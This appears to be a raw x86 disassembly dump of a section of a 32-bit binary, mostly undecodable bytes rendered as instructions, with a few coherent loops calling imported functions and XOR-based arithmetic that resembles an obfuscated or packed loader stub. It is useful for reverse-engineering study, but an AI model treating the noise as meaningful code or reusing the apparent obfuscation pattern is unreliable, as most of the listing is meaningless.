  408418:	mul    BYTE PTR [ecx+0x70e64020]
  40841e:	xchg   ebp,eax
  40841f:	ss xchg edx,eax
  408421:	push   0x7e
  408423:	xor    DWORD PTR [ebp+edx*1+0x239b99ab],0x771bc250
  40842e:	inc    ebp
  40842f:	mov    DWORD PTR [esi-0x4eafc707],esp
  408435:	jp     0x40843c
  408437:	and    eax,0x2b813e52
  40843c:	mov    al,0x48
  40843e:	jmp    0x4083f9
  408440:	sub    ebp,ebp
  408442:	xor    DWORD PTR cs:[esi+0x0],ebx
  408446:	js     0x40848d
  408448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408449:	pop    DWORD PTR [esp+esi*4-0x42780c0c]
  408450:	xor    ah,BYTE PTR [eax+0x62]
  408453:	sbb    eax,0xacd95e27
  408458:	push   edx
  408459:	fild   QWORD PTR [ecx]
  40845b:	dec    edi
  40845c:	enter  0xe51a,0xe7
  408460:	scas   eax,DWORD PTR es:[edi]
  408461:	lock shr BYTE PTR [eax+0x34],cl
  408465:	test   al,ah
  408467:	and    eax,0x8170a51e
  40846c:	lock adc edx,DWORD PTR [ebp+0x44]
  408470:	mov    ?,edx
  408472:	pop    ss
  408473:	cmc    
  408474:	fld    DWORD PTR [ebp+edi*2-0x4a]
  408478:	jg     0x4084a9
  40847a:	repz mov cl,0xbc
  40847d:	mov    cl,0x45
  40847f:	sub    BYTE PTR [ecx],cl
  408481:	shl    DWORD PTR [esi],0xd0
  408484:	in     eax,dx
  408485:	neg    al
  408487:	(bad)  
  408488:	lea    edi,[edx-0x1efaec0e]
  40848e:	jns    0x4084f5
  408490:	and    dh,BYTE PTR [edx+0x3c]
  408493:	mov    bh,0xd1
  408495:	pop    es
  408496:	loope  0x408443
  408498:	pop    es
  408499:	jbe    0x4084b4
  40849b:	adc    al,0x5f
  40849d:	hlt    
  40849e:	cmp    eax,0x276574a9
  4084a3:	xlat   BYTE PTR ds:[ebx]
  4084a4:	jns    0x408476
  4084a6:	out    dx,eax
  4084a7:	imul   eax,eax,0xfffffff3
  4084aa:	es dec ecx
  4084ac:	imul   esi,ecx,0x69d72e5d
  4084b2:	jbe    0x408495
  4084b4:	daa    
  4084b5:	out    0x4b,al
  4084b7:	das    
  4084b8:	ror    ebp,1
  4084ba:	push   cs
  4084bb:	inc    ebp
  4084bc:	sbb    DWORD PTR [ebp+edi*2+0x2153bff2],edx
  4084c3:	push   esp
  4084c4:	int3   
  4084c5:	mov    ah,BYTE PTR [edi-0x4d]
  4084c8:	mov    BYTE PTR [ebp-0x4],ch
  4084cb:	and    dl,BYTE PTR ds:0xa14e14ef
  4084d1:	data16 adc al,0xa4
  4084d4:	fnsave [eax+0x5d3e8a6a]
  4084da:	mov    eax,ds:0xcc12c7ce
  4084df:	add    esi,DWORD PTR ds:[edi]
  4084e2:	es sar ebx,cl
  4084e5:	cmp    ch,al
  4084e7:	dec    edx
  4084e8:	or     esi,esp
  4084ea:	fsubr  st,st(5)
  4084ec:	sbb    DWORD PTR [edx+0x350676be],edi
  4084f2:	ret    
  4084f3:	je     0x408e47
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43372f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43372f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43372f,edx
  408521:	cmp    DWORD PTR ds:0x43372f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43372f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433767
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433617,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433673
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4336bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4336bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4336bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4336bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4336bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	clc    
  4085de:	gs push eax
  4085e0:	daa    
  4085e1:	in     al,dx
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	clc    
  4085ea:	pop    edx
  4085eb:	sbb    eax,0x34985843
  4085f0:	mov    ds:0xf4d27f99,eax
  4085f5:	mov    eax,ds:0xed9179e6
  4085fa:	not    BYTE PTR [ebp-0x140eb45b]
  408600:	sbb    dh,BYTE PTR [edi]
  408602:	add    DWORD PTR [ebx+ebx*8],edi
  408605:	addr16 mov edi,0x2946e43
  40860b:	shr    BYTE PTR [eax],1
  40860d:	adc    ecx,DWORD PTR [edi-0x2236434b]
  408613:	lock pop edx
  408615:	cmp    esi,DWORD PTR [ecx-0x31]
  408618:	sbb    edi,DWORD PTR [ebp-0xd]
  40861b:	sbb    eax,0x54492455
  408620:	cmp    eax,0xfd4f84cf
  408625:	pop    ds
  408626:	pop    esi
  408627:	scas   eax,DWORD PTR es:[edi]
  408628:	and    eax,0x2e3972a2
  40862d:	xchg   esi,eax
  40862e:	in     al,0xc4
  408630:	clc    
  408631:	bound  ecx,QWORD PTR [eax]
  408633:	mov    ds:0xe0aca2ec,al
  408638:	shr    ebx,cl
  40863a:	(bad)  
  40863b:	or     bh,BYTE PTR [edi+0x6c]
  40863e:	stos   BYTE PTR es:[edi],al
  40863f:	dec    ecx
  408640:	and    esp,DWORD PTR [ecx]
  408642:	fs xor ebx,ebp
  408645:	popa   
  408646:	ins    DWORD PTR es:[edi],dx
  408647:	jle    0x40860e
  408649:	jno    0x408699
  40864b:	mov    eax,ecx
  40864d:	lock fstp st(1)
  408650:	into   
  408651:	cmp    cl,ch
  408653:	mov    esi,0x2787b11a
  408658:	mov    edx,0xda3a101
  40865d:	and    eax,0xdcfc27dc
  408662:	push   ss
  408663:	outs   dx,BYTE PTR ds:[esi]
  408664:	dec    ecx
  408665:	sub    BYTE PTR [esi-0x7f],al
  408668:	das    
  408669:	(bad)  
  40866a:	and    al,0x0
  40866c:	icebp  
  40866d:	fldcw  WORD PTR [edx+ebp*2-0x73]
  408671:	adc    esp,DWORD PTR [edx+0x6f16a7e5]
  408677:	js     0x408636
  408679:	jp     0x408645
  40867b:	cmc    
  40867c:	cmp    ch,BYTE PTR [edi]
  40867e:	push   edi
  40867f:	jmp    0xf662c572
  408684:	loope  0x408668
  408686:	pop    esp
  408687:	adc    dh,dh
  408689:	clc    
  40868a:	(bad)  
  40868b:	lods   al,BYTE PTR ds:[esi]
  40868c:	int    0x1b
  40868e:	push   edx
  40868f:	dec    esi
  408690:	mov    WORD PTR [edi+0x5ea0f9b3],?
  408696:	pop    es
  408697:	jbe    0x408693
  408699:	fdiv   QWORD PTR [ecx]
  40869b:	je     0x40870b
  40869d:	ins    DWORD PTR es:[edi],dx
  40869e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40869f:	push   ds
  4086a0:	xor    BYTE PTR [esi-0x4c],bl
  4086a3:	xlat   BYTE PTR ds:[ebx]
  4086a4:	out    0x1b,al
  4086a6:	in     eax,dx
  4086a7:	bound  ebx,QWORD PTR [edx+0x4944e5c2]
  4086ad:	shl    BYTE PTR [ebp+0x1d],1
  4086b0:	pop    edx
  4086b1:	xor    eax,0xb5ed9278
  4086b6:	adc    ch,0xa9
  4086b9:	pop    es
  4086ba:	scas   al,BYTE PTR es:[edi]
  4086bb:	dec    esi
  4086bd:	jno    0x408641
  4086bf:	sbb    esp,0xc666f85
  4086c5:	pop    sp
  4086c7:	mov    al,0x52
  4086c9:	mov    DWORD PTR [ebp-0x58d98761],edx
  4086cf:	sbb    dl,BYTE PTR [esi]
  4086d1:	loope  0x4086fa
  4086d3:	push   cs
  4086d4:	mov    ds:0x3cce46c7,al
  4086d9:	loop   0x408694
  4086db:	(bad)  
  4086dc:	pop    eax
  4086dd:	xchg   edi,eax
  4086de:	std    
  4086df:	add    DWORD PTR [esi],edx
  4086e1:	shl    BYTE PTR [edi-0x4be00706],0x0
  4086e8:	adc    dh,dl
  4086ea:	and    ecx,ecx
  4086ec:	pop    edi
  4086ed:	pop    eax
  4086ee:	ret    
  4086ef:	ins    BYTE PTR es:[edi],dx
  4086f0:	aaa    
  4086f1:	jge    0x408714
  4086f3:	into   
  4086f4:	push   edi
  4086f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086f6:	dec    edx
  4086f7:	mov    al,ds:0x7b972db7
  4086fc:	pop    esp
  4086fd:	push   0x76c281bd
  408702:	push   ds
  408703:	fcomip st,st(4)
  408705:	iret   
  408706:	lds    ebp,FWORD PTR [edx]
  408708:	popa   
  408709:	dec    esi
  40870a:	sbb    DWORD PTR ds:0x49dea438,edx
  408710:	shl    bl,0x31
  408713:	aam    0x3a
  408715:	xor    DWORD PTR [ebx],ecx
  408717:	mov    al,0x60
  408719:	sub    eax,0x725a5d53
  40871e:	imul   esp
  408720:	jne    0x408754
  408722:	mov    al,0x47
  408724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408725:	push   ss
  408726:	cmp    BYTE PTR [ecx+0x7f],al
  408729:	repnz pop edi
  40872b:	imul   esi,DWORD PTR [ecx-0x12e428f3],0x6f
  408732:	sbb    ebx,DWORD PTR [eax]
  408734:	push   esp
  408735:	mov    ds:0x8cbd2705,al
  40873a:	mov    dl,0x37
  40873c:	xchg   ebp,eax
  40873d:	pushf  
  40873e:	adc    al,0xdd
  408740:	test   BYTE PTR [ecx],dh
  408742:	mov    edi,0x417398be
  408747:	mov    ecx,DWORD PTR [esi]
  408749:	js     0x408736
  40874b:	add    DWORD PTR [edx],edx
  40874d:	sbb    eax,0x42fadd2b
  408752:	mov    ds:0x33f8458b,al
  408757:	rol    DWORD PTR [ebx],0xc6
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [edx+0x522230fc],bl
  408770:	sar    DWORD PTR [esi+0x7e],cl
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	fidivr WORD PTR [ebx+0x21dd6822]
  40877d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40877e:	in     al,dx
  40877f:	pop    edx
  408780:	adc    eax,0x9269c7b7
  408785:	adc    ecx,DWORD PTR [edi+edx*8-0x552643e0]
  40878c:	fisub  WORD PTR [eax-0x3d774b39]
  408792:	adc    eax,0x509e270a
  408797:	xchg   DWORD PTR [ebx+0x48090791],ecx
  40879d:	in     eax,dx
  40879e:	leave  
  40879f:	jp     0x4087f4
  4087a1:	xchg   edi,eax
  4087a2:	push   edx
  4087a3:	cmp    cl,BYTE PTR [ebp+0x6c]
  4087a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087a7:	sub    eax,0x2cc5ba9e
  4087ac:	in     eax,0x1b
  4087ae:	inc    edi
  4087af:	rol    DWORD PTR [esi],cl
  4087b1:	xor    BYTE PTR ds:0x8a93f24b,ah
  4087b7:	pop    ebx
  4087b8:	cdq    
  4087b9:	mov    dl,0x4e
  4087bb:	push   eax
  4087bc:	jmp    DWORD PTR [ebx-0x3a5a32c4]
  4087c2:	sahf   
  4087c3:	iret   
  4087c4:	ret    
  4087c5:	push   esi
  4087c6:	pop    ss
  4087c7:	cdq    
  4087c8:	jge    0x4087c3
  4087ca:	stc    
  4087cb:	jbe    0x4087d4
  4087cd:	sbb    dl,BYTE PTR [ebx]
  4087cf:	in     eax,0x74
  4087d1:	and    bl,ah
  4087d3:	ins    WORD PTR es:[edi],dx
  4087d5:	popf   
  4087d6:	mov    edx,0xe08be360
  4087db:	cmp    ecx,DWORD PTR [eax+ebp*2+0x28]
  4087df:	icebp  
  4087e0:	pop    ebx
  4087e1:	jo     0x40885e
  4087e3:	push   es
  4087e4:	cdq    
  4087e5:	mov    ebp,0x2ad5ff8f
  4087ea:	ja     0x408832
  4087ec:	push   esp
  4087ed:	mul    BYTE PTR ss:[eax+0x15]
  4087f1:	into   
  4087f2:	arpl   WORD PTR ss:[ebp+0x4f09ce7b],si
  4087f9:	or     BYTE PTR [ecx+0x65e2b03c],0x3f
  408800:	inc    edi
  408801:	cmc    
  408802:	pusha  
  408803:	adc    ah,BYTE PTR [ecx]
  408805:	cmp    al,0xf1
  408807:	das    
  408808:	mov    eax,0x86eef6c
  40880d:	add    dl,BYTE PTR [ebp-0x32dcc341]
  408813:	repz pop ebx
  408815:	(bad)  
  408816:	in     al,dx
  408817:	jo     0x4087a5
  408819:	or     edi,DWORD PTR [edi+0xd2ab40d]
  40881f:	xor    al,0xea
  408821:	js     0x408879
  408823:	repz clc 
  408825:	pop    esi
  408826:	xchg   DWORD PTR [ebx+0x73],esi
  408829:	imul   edx,DWORD PTR [esi+0x5c],0xc24d759c
  408830:	aas    
  408831:	repnz sar DWORD PTR [ebx],0x3f
  408835:	in     eax,dx
  408836:	sahf   
  408837:	test   BYTE PTR [eax],0x67
  40883a:	mov    al,ds:0x623cfe00
  40883f:	lods   eax,DWORD PTR ds:[esi]
  408840:	and    al,0xb
  408842:	push   edi
  408843:	push   edx
  408844:	dec    edx
  408845:	dec    edi
  408846:	or     eax,esp
  408848:	add    eax,0xc8c28bd4
  40884d:	mov    ch,0x2f
  40884f:	iret   
  408850:	and    ebp,DWORD PTR [ebx+0x339bf734]
  408856:	adc    eax,0xd050e9f5
  40885b:	mov    dl,0x5d
  40885d:	dec    ecx
  40885e:	mul    BYTE PTR [ebx-0x1f]
  408861:	(bad)  
  408862:	mov    cl,0x32
  408864:	xchg   ebp,eax
  408865:	test   eax,ebp
  408867:	push   esi
  408868:	ins    DWORD PTR es:[edi],dx
  408869:	xor    eax,0xbd11b46f
  40886e:	sub    ebx,DWORD PTR [eax+ebx*8]
  408871:	dec    edi
  408872:	pop    ds
  408873:	leave  
  408874:	jb     0x408899
  408876:	fwait
  408877:	jmp    0xe4b1c88c
  40887c:	mov    ecx,0x7b14b856
  408881:	and    ebx,DWORD PTR [ecx-0x36]
  408884:	mov    eax,0x63386d19
  408889:	cmp    eax,edi
  40888b:	lods   al,BYTE PTR ds:[esi]
  40888c:	aam    0xb5
  40888e:	fld    st(1)
  408890:	pop    eax
  408891:	lea    esp,[eax]
  408893:	mov    ch,BYTE PTR [edx]
  408895:	lds    cx,DWORD PTR [eax+0x5073cc56]
  40889c:	jecxz  0x408821
  40889e:	repz mov edx,0xf4e8b5e1
  4088a4:	sbb    eax,0xf8140d27
  4088a9:	cmc    
  4088aa:	ins    DWORD PTR es:[edi],dx
  4088ab:	xchg   ebp,esp
  4088ad:	pop    ebx
  4088ae:	(bad)  
  4088af:	out    0x60,eax
  4088b1:	dec    esp
  4088b2:	test   dh,bh
  4088b4:	sar    DWORD PTR [esi+ebp*1+0x66ee4a60],cl
  4088bb:	cdq    
  4088bc:	rcr    al,0x58
  4088bf:	fcmovnb st,st(6)
  4088c1:	pop    edx
  4088c2:	mov    ch,0xa4
  4088c4:	jbe    0x408855
  4088c6:	xor    al,0xca
  4088c8:	loop   0x40890a
  4088ca:	dec    edi
  4088cb:	push   cs
  4088cc:	adc    eax,0x7099d168
  4088d1:	mov    edi,0x3a8f8197
  4088d6:	sbb    DWORD PTR [edx],0x38
  4088d9:	ficom  DWORD PTR [ebp-0x7deeb86a]
  4088df:	jb     0x4088b2
  4088e1:	pop    edi
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0xaec0681a
  40893f:	push   edi
  408940:	xlat   BYTE PTR ds:[ebx]
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	xor    bl,BYTE PTR [esi+esi*1-0x2746cd40]
  408950:	hlt    
  408951:	aad    0x87
  408953:	jnp    0x4088e8
  408955:	jno    0x4088ee
  408957:	mov    BYTE PTR [ecx-0x23],dh
  40895a:	cdq    
  40895b:	dec    edx
  40895c:	adc    eax,0x34f41df0
  408962:	lahf   
  408963:	std    
  408964:	and    eax,0xd38907a5
  408969:	mov    ch,0x2a
  40896b:	adc    edx,DWORD PTR [edx+ebp*1-0x354db5f2]
  408972:	js     0x40892e
  408974:	pop    ecx
  408975:	out    0xf6,eax
  408977:	ss add bh,ch
  40897a:	in     al,0x5a
  40897c:	jb     0x40893e
  40897e:	(bad)  
  40897f:	adc    edi,DWORD PTR [edx+eiz*8+0x2cac75ff]
  408986:	sahf   
  408987:	fmul   st,st(2)
  408989:	jg     0x408929
  40898b:	js     0x408927
  40898d:	in     eax,0xce
  40898f:	retf   
  408990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408991:	ret    
  408992:	int    0xb7
  408994:	ss push 0x5ead6099
  40899a:	jo     0x408982
  40899c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40899d:	sbb    BYTE PTR [eax-0x2f],dl
  4089a0:	imul   ebx,ecx,0xf42d6cba
  4089a6:	xchg   BYTE PTR [eax-0x91eb61b],bh
  4089ac:	jg     0x408994
  4089ae:	jge    0x40896d
  4089b0:	enter  0xee11,0x7f
  4089b4:	std    
  4089b5:	shl    DWORD PTR [ebx],1
  4089b7:	pop    ebp
  4089b8:	cmp    bl,ch
  4089ba:	mov    ecx,0xdbf9d440
  4089bf:	jo     0x40896d
  4089c1:	push   edi
  4089c2:	push   esp
  4089c3:	dec    esp
  4089c4:	xor    edi,esp
  4089c6:	in     eax,dx
  4089c7:	lock ss inc eax
  4089ca:	sub    bh,dh
  4089cc:	div    DWORD PTR ds:0x4ad1472f
  4089d2:	xor    al,0xdb
  4089d4:	data16 sbb al,0x42
  4089d7:	jecxz  0x40899c
  4089d9:	stc    
  4089da:	xchg   esi,eax
  4089db:	jge    0x4089a3
  4089dd:	sbb    edx,eax
  4089df:	fs fcomi st,st(5)
  4089e2:	aas    
  4089e3:	add    al,0x78
  4089e5:	call   0xba543bc8
  4089ea:	mov    dl,0xbf
  4089ec:	adc    bh,BYTE PTR [edx-0x31]
  4089ef:	adc    BYTE PTR gs:[eax],0xa8
  4089f3:	xchg   edx,eax
  4089f4:	push   esi
  4089f5:	adc    esp,ebx
  4089f7:	pop    ecx
  4089f8:	xchg   edx,eax
  4089f9:	jb     0x408a16
  4089fb:	add    eax,0x877593b6
  408a00:	rcl    DWORD PTR [ebx+0x52e2976a],0xa3
  408a07:	hlt    
  408a08:	or     al,0x4f
  408a0a:	jge    0x408a81
  408a0c:	lods   eax,DWORD PTR ds:[esi]
  408a0d:	jecxz  0x408a41
  408a0f:	shl    dl,0x9e
  408a12:	dec    edx
  408a13:	rcr    DWORD PTR [ebp-0x70d82db1],1
  408a19:	dec    edi
  408a1a:	push   ecx
  408a1b:	jmp    0xe995:0xdf87ed3c
  408a22:	mov    ds:0x984e4508,al
  408a27:	dec    esi
  408a28:	pop    ebp
  408a29:	pop    ss
  408a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2b:	inc    DWORD PTR [edi+0x3074a6f]
  408a31:	les    esi,FWORD PTR [ebp+edi*8-0x67480240]
  408a38:	repz rol DWORD PTR [ecx],cl
  408a3b:	into   
  408a3c:	xchg   DWORD PTR [esi],esi
  408a3e:	call   0xe733:0xaf1b8a0e
  408a45:	(bad)  
  408a46:	lods   eax,DWORD PTR ds:[esi]
  408a47:	push   0xffffffcc
  408a49:	imul   edi,DWORD PTR [ecx-0x4],0x23
  408a4d:	or     ah,BYTE PTR [esi]
  408a4f:	out    dx,al
  408a50:	adc    DWORD PTR [eax+0x574e5e5a],ebp
  408a56:	stos   BYTE PTR es:[edi],al
  408a57:	lds    esp,FWORD PTR [ebp-0x27c098dc]
  408a5d:	mov    ds,WORD PTR [edx-0x7d]
  408a60:	(bad)  
  408a61:	out    dx,eax
  408a62:	adc    BYTE PTR [esi-0x67a6f145],bh
  408a68:	dec    ecx
  408a69:	xor    BYTE PTR [edx-0x2d4ae26],bl
  408a6f:	jmp    ecx
  408a71:	adc    BYTE PTR [edi],ah
  408a73:	lea    esi,[esi]
  408a75:	ret    
  408a76:	sbb    ebx,0xea01d3bd
  408a7c:	and    edx,DWORD PTR [ecx+esi*4-0x26]
  408a80:	fld    TBYTE PTR [ecx+esi*1-0x1f]
  408a84:	push   ss
  408a85:	ja     0x408a68
  408a87:	rol    edx,cl
  408a89:	jo     0x408a56
  408a8b:	mov    WORD PTR [esi-0x73],?
  408a8e:	in     eax,0x82
  408a90:	jmp    0x408aea
  408a92:	jmp    0xcdd:0xbdb5d94c
  408a99:	mov    edx,es
  408a9b:	pop    es
  408a9c:	fwait
  408a9d:	sbb    al,0x51
  408a9f:	int3   
  408aa0:	std    
  408aa1:	jns    0x408a72
  408aa3:	aaa    
  408aa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aa5:	clc    
  408aa6:	fdivr  DWORD PTR [ecx]
  408aa8:	sbb    eax,0x5dc846d8
  408aad:	rcr    DWORD PTR [edi],1
  408aaf:	add    DWORD PTR [ebx+0xd],edx
  408ab2:	push   edx
  408ab3:	mov    edi,DWORD PTR [ebp+0x8]
  408ab6:	mov    edi,DWORD PTR [edi]
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	push   esp
  408b1b:	sbb    al,0x29
  408b1d:	(bad)  
  408b1e:	scas   al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	pusha  
  408b27:	adc    BYTE PTR [ebp+0x6cb3d2a7],bl
  408b2d:	imul   edx,DWORD PTR [eax+ebx*2],0xfffffff6
  408b31:	in     al,dx
  408b32:	(bad)  
  408b33:	jl     0x408b8d
  408b35:	gs dec ecx
  408b37:	add    ebx,DWORD PTR [edi]
  408b39:	pop    ebx
  408b3a:	out    0x2,al
  408b3c:	xchg   ebx,eax
  408b3d:	into   
  408b3e:	repnz cmp ebx,edi
  408b41:	and    BYTE PTR [ecx-0xef2f2dc],bh
  408b47:	mov    eax,gs:0x2599116c
  408b4d:	xchg   edx,eax
  408b4e:	popf   
  408b4f:	cmp    al,0x8
  408b51:	jae    0x408bc1
  408b53:	bound  edi,QWORD PTR [ebx+ebx*4+0x5e]
  408b57:	cwde   
  408b58:	mov    dh,0x3
  408b5a:	mov    DWORD PTR [esi+0x7c],eax
  408b5d:	mov    ebx,0xf346a878
  408b62:	cmp    eax,0x537d6bee
  408b67:	mov    cl,0x66
  408b69:	xchg   edx,eax
  408b6a:	ficomp DWORD PTR [esi]
  408b6c:	inc    ecx
  408b6d:	pop    ecx
  408b6e:	imul   BYTE PTR [edx-0x23475b8f]
  408b74:	out    0x15,eax
  408b76:	rol    BYTE PTR [ebx-0x4fb98d4f],0x3
  408b7d:	inc    eax
  408b7e:	mov    dh,0x40
  408b80:	loop   0x408b18
  408b82:	mov    ah,0x98
  408b84:	mov    dl,0xe
  408b86:	and    DWORD PTR [esi+ebx*4],edi
  408b89:	idiv   DWORD PTR [edx]
  408b8b:	inc    edi
  408b8c:	test   al,0xc3
  408b8e:	mov    esp,0x7e03755e
  408b93:	or     esi,DWORD PTR [esi+0x0]
  408b96:	loop   0x408b1c
  408b98:	ret    
  408b99:	inc    BYTE PTR [ebx-0xf89d66f]
  408b9f:	xchg   esp,eax
  408ba0:	iret   
  408ba1:	pop    ecx
  408ba2:	jmp    0x76bf:0xa49240c9
  408ba9:	pop    eax
  408baa:	cmc    
  408bab:	mov    al,0x69
  408bad:	inc    edi
  408bae:	jmp    0x408bbf
  408bb0:	shl    DWORD PTR [eax+0x38],1
  408bb3:	pop    esi
  408bb4:	jae    0x408b3e
  408bb6:	test   al,0x9
  408bb8:	xchg   dl,ah
  408bba:	xchg   DWORD PTR [edx-0x7c],ebx
  408bbd:	or     ah,0x25
  408bc0:	daa    
  408bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bc2:	xchg   esp,eax
  408bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bc4:	lock imul eax,DWORD PTR [ebx],0x1a
  408bc8:	mov    WORD PTR [esi],fs
  408bca:	sbb    al,BYTE PTR [ecx]
  408bcc:	mov    ebx,0xc6604d9f
  408bd1:	sub    ebx,DWORD PTR [ebp-0x42]
  408bd4:	xor    ebx,esp
  408bd6:	rol    DWORD PTR [edx-0x32df36b9],0x6a
  408bdd:	mov    esp,0x73743fea
  408be2:	jp     0x408c40
  408be4:	(bad)  
  408be5:	adc    BYTE PTR [edi],al
  408be7:	mov    edx,0xca312ba4
  408bec:	mov    dl,0x78
  408bee:	cmp    BYTE PTR [edi+0x10],al
  408bf1:	enter  0xbddb,0xc8
  408bf5:	mov    dh,0xbb
  408bf7:	ret    
  408bf8:	rcr    DWORD PTR [ecx],0x30
  408bfb:	add    DWORD PTR [esi],esi
  408bfd:	xchg   esi,eax
  408bfe:	pusha  
  408bff:	mov    dl,0xfa
  408c01:	xor    al,0xc4
  408c03:	in     al,dx
  408c04:	lock in al,0x6
  408c07:	adc    eax,0xd7d55ae2
  408c0c:	ss (bad) 
  408c0e:	fild   QWORD PTR [ecx+0x22]
  408c11:	into   
  408c12:	xchg   edi,eax
  408c13:	mov    gs,esp
  408c15:	and    bl,BYTE PTR [ebx]
  408c17:	xchg   DWORD PTR [ebp+0x2c],ebp
  408c1a:	or     BYTE PTR [ecx+0x38995ee3],bl
  408c20:	mov    ecx,0xfea31a9e
  408c25:	adc    ah,BYTE PTR [edx]
  408c27:	xor    eax,0x4daff62c
  408c2c:	jg     0x408c5d
  408c2e:	inc    esp
  408c2f:	jo     0x408c6d
  408c31:	(bad)  
  408c32:	push   edx
  408c33:	(bad)  
  408c34:	adc    dl,BYTE PTR ds:0xc45e3179
  408c3a:	push   eax
  408c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c3c:	ins    DWORD PTR es:[edi],dx
  408c3d:	jge    0x408bfa
  408c3f:	sbb    ebx,DWORD PTR [ecx+0x71]
  408c42:	lahf   
  408c43:	fs popa 
  408c45:	xor    al,BYTE PTR [ecx+0x7b]
  408c48:	je     0x408c22
  408c4a:	jecxz  0x408bcd
  408c4c:	xor    DWORD PTR [eax*4-0x6b40f957],0xffffffd7
  408c54:	dec    edx
  408c55:	mov    ds:0xb90a83e4,al
  408c5a:	dec    edi
  408c5b:	push   0x57
  408c5d:	xor    dh,BYTE PTR [eax+0xa5894b7]
